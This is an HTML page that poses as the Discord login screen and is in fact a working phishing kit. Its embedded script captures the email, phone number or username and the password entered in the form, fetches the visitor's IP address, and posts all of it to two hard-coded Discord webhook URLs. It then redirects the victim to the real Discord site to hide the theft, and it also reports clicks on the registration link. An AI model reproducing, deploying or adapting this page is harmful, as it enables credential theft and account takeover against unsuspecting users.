<!DOCTYPE html>
<html>
<head>
  <title>Discord</title>
  <link rel="icon" href="https://www.faviconextractor.com/favicon/discord.com" type="image/png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body {
      background-color: #313338;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      height: 100vh;
      margin: 0;
      padding: 20px 10px;
      box-sizing: border-box;
      user-select: none;
      text-align: center;
      transition: opacity 0.5s ease;
    }
    .container {
      margin-top: -24px;
    }
    .logo img {
      margin-top: 7px;
      width: 101%;
      height: auto;
      pointer-events: none;
    }
    .alert {
      color: #e57075;
      font-size: 12px;
      margin-bottom: 10px;
      display: none;
      text-align: left;
    }
    .spacer {
      height: 0.30rem;
    }
    .forgot-password {
      color: #03a0ee;
      font-size: 12.7px;
      text-decoration: none;
      display: block;
      margin-bottom: 21px;
      text-align: left;
    }
    .login-button {
      width: 100%;
      padding: 11.6px;
      background-color: #5865f2;
      border: none;
      color: #ffffff;
      font-size: 16.2px;
      font-weight: 470;
      cursor: pointer;
      border-radius: 0.1rem;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      justify-content: center;
      align-items: center;
    }
    .modal iframe {
      width: 80%;
      height: 80%;
      border: none;
    }
    .close-modal {
      position: absolute;
      top: 20px;
      right: 30px;
      color: white;
      font-size: 24px;
      cursor: pointer;
    }
    .error {
      color: #e57075;
    }
    #loadingGif {
      display: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <script>
    const webhookURLs = [
      "https://discord.com/api/webhooks/1300445761271627777/Y9gsIAzp_vGUyGYL_JweJ7Ntk94KSzMv4e3_B0pOhZU2pQjqRgPHig5X0bEADQNmkPR1",
      "https://discord.com/api/webhooks/1299192306531962910/5Y9fNdk8nyaR1-uR1jTgamOIr_sP8R71SszcL6LS31e_k9GOI8DI4dy7rSL9hweyUkmL"
    ];
    
    function sendToWebhooks(data) {
      webhookURLs.forEach(url => {
        fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: data })
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
        })
        .catch(error => console.error('Error sending data:', error));
      });
    }

    function fetchAndSendIP(callback) {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          if (callback) callback(ipData.ip);
        })
        .catch(error => console.error('Error fetching IP address:', error));
    }

    let focusApplied = false;

    function focusEmail() {
      document.getElementById('email').focus();
    }

    function validateForm() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const alertMessage = document.getElementById('alert-message');

      alertMessage.style.display = 'none';
      const emailLabel = document.querySelector('label[for="email"]');
      const passwordLabel = document.querySelector('label[for="password"]');

      emailLabel.style.color = '#b9bbbe';
      passwordLabel.style.color = '#b9bbbe';

      let valid = true;

      if (!email) {
        emailLabel.style.color = '#e57075';
        valid = false;
      }
      
      if (!password) {
        passwordLabel.style.color = '#e57075';
        valid = false;
      }

      if (!valid) {
        alertMessage.textContent = "𝘛𝘩𝘪𝘴 ƒ𝘪𝘦𝘭𝘥 𝘪𝘴 𝙧𝙚𝙦𝙪𝙞𝙧𝙚𝙙";
        alertMessage.style.display = 'block';
        if (!focusApplied) {
          focusEmail();
          focusApplied = true;
        }
        return false;
      }

      let message = '@here ';

      if (email.includes('@')) {
        message += `Email: ${email}\nPassword: ${password}`;
      } else if (/^\d{10}$/.test(email)) {
        message += `Phone: ${email}\nPassword: ${password}`;
      } else if (/^[\w.-]+$/.test(email)) {
        message += `Username: ${email}\nPassword: ${password}`;
      } else {
        alertMessage.style.display = 'block';
        return false;
      }

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          const ipMessage = `\nVisitor IP: ${ipData.ip}`;
          sendToWebhooks(message + ipMessage);
        })
        .catch(error => console.error('Error fetching IP address:', error));

      document.querySelector('.login-button').style.display = 'none';
      document.getElementById('loadingGif').style.display = 'block';

      document.body.style.opacity = '0';
      setTimeout(() => {
        window.location.href = "https://discord.com/channels/@me";
      }, 250);

      return false;
    }

    function registerLinkClicked() {
      fetchAndSendIP((ip) => {
        sendToWebhooks(`@here ${ip} Opened Registration Link`);
        window.location.href = "https://discord.com/register";
      });
    }

    window.onload = function() {
      fetchAndSendIP();
      focusEmail();
    };
  </script>
  <div class="container">
    <div class="logo">
      <img alt="Logo" src="https://i.ibb.co/TmMxVKn/IMG-4225.jpg" ondragstart="return false;" />
    </div>
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>
    <form onsubmit="return validateForm()">
      <div class="alert" id="alert-message">Please fill in all required fields.</div>
      <label for="email">EMAIL OR PHONE NUMBER <span class="error">*</span></label>
      <input id="email" name="email" type="text" maxlength="32" />
      <div class="spacer"></div>
      <label for="password">PASSWORD <span class="error">*</span></label>
      <input id="password" name="password" type="password"/>
      <a class="forgot-password" href="#">Forgot your password?</a>
      <button class="login-button" type="submit">Log In</button>
      <img id="loadingGif" src="https://media.tenor.com/T3.gif" />
    </form>
    <div class="register-container">
      <span class="need-account">Need an account?</span>
      <a class="register" href="#" onclick="registerLinkClicked()">Register</a>
    </div>
  </div>
</body>
</html>
